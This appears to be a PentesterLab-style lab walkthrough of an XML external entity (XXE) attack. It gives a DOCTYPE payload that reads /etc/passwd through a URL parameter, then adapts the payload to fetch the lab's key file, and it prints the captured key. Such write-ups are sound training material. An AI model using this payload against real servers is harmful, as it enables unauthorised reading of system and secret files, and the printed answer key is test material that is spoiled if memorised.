XML Attacks 01

Some XML parsers will resolve external entities, and will allow a user controlling the XML message to access resources; for example to read a file on the system. 
The following entity can be declared, for example:

<!ENTITY x SYSTEM "file:///etc/passwd">

You will need to envelope this properly, in order to get it to work correctly:

<!DOCTYPE test [
    <!ENTITY x SYSTEM "file:///etc/passwd">]>

You can then simply use the reference to x: &x; (don't forget to encode &) to get the corresponding result inserted in the XML document during its parsing (server side).

 You can access this exercise using the following URL: http://ptc-2577a623-0aa82abb.libcurl.so/.

 Steps:
    1) Visit the given URL: http://ptc-2577a623-0aa82abb.libcurl.so/.
    2) And we'll redirected to: http://ptc-2577a623-0aa82abb.libcurl.so/?xml=<test>hacker</test>
    3) Make some changes in parameter to find etc/passwd as:
        http://ptc-2577a623-0aa82abb.libcurl.so/?xml=<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]><test>hacker</test>
    4) Replace the hacker with %26x; and we can get /etc/passwd.
    5) Replace the "file:///etc/passwd" with "/pentesterlab.key". 
    6) Bravo!! We've completed the lab and the key is: a996553c-416f-472e-9185-f91dc3bcdd79.

        Happy Hacking!! :) 